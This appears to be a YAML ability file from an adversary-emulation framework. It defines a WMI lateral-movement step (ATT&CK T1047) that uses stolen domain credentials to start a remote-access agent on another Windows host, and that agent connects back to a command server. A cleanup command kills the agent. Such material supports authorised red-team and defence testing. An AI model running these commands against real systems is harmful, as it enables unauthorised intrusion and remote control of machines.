---

- id: ece5dde3-d370-4c20-b213-a1f424aa8d03
  name: Start 54ndc47 (WMI)
  description: Remotely executes 54ndc47 over WMI
  tactic: lateral-movement
  technique:
    attack_id: T1047
    name: Windows Management Instrumentation
  platforms:
    windows:
      psh:
        command: |
          wmic /node:`"#{remote.host.fqdn}`" /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group} -executors psh";
        cleanup: |
          wmic /node:`"#{remote.host.fqdn}`" /user:#{domain.user.name} /password:#{domain.user.password} process call create "taskkill /f /im s4ndc4t.exe"
  requirements:
    plugins.stockpile.app.requirements.basic:
      - source: domain.user.name
        edge: has_password
        target: domain.user.password
